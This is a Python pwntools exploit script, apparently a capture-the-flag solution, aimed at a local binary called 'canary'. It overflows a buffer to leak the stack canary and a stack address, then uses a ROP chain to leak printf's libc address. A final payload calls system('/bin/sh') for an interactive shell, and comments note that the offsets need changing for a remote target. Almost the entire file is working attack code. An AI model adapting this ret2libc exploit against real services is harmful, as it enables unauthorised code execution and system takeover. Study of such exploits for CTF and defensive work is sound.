#!/usr/bin/env python3 
from pwn import *

p = process("./canary")
p.recvuntil(b": ")

## Gadgets/Constants ##
pop_rdi = p64(0x401373)
pop_rsi_r15 = p64(0x401371)
printf_plt_addr = p64(0x404030)
puts_func = p64(0x4010a0)
pop_rbp = p64(0x4011dd)
read_back_to_stack = p64(0x40127d)
just_ret = p64(0x4012b5)


## Leak Canary ##
p.sendline(b"B"*72)
p.recvline()
p.recv(72)
canary = u64(p.recv(8)) - 0xa # we overwrite last byte with newline
stack_leak = u64(p.recv(6)+b"\x00\x00")
rbp = stack_leak - 112 + 0x50
rsp = rbp - 0x60
my_buffer = stack_leak - 112
print("Stack-Leak: ",hex(stack_leak))

## Second question ##
p.recvline()
p.send(b"n")
stack = pop_rdi + printf_plt_addr + puts_func + pop_rbp + p64(rbp) + read_back_to_stack
stack = stack + (72-len(stack))*b"X"
payload = stack + p64(canary) + p64(my_buffer-8)
assert len(payload) == 88
pause()
p.sendline(payload)
print("[I]",p.recvline())

printf_leak = u64(p.recv(6) + b"\x00\x00") 
system_func = (printf_leak - 0xee10 ) # Replace offset for remote
bin_sh_str = printf_leak + 0x15b8aa # This one too
print("Bin-sh:", hex(bin_sh_str))

## Get a Shell ## 
#p.sendline(b"A"*8+ b"B"*8+b"C"*8+b"D"*8+b"E"*7+b"F"*8+b"G"*8+b"H"*8+b"I"*8)
p.sendline(b"/bin/sh\x00" + p64(0) + b"A"*23 + just_ret + pop_rdi + p64(rsp-39+56) + p64(system_func))


## Get Flag ##
p.interactive()
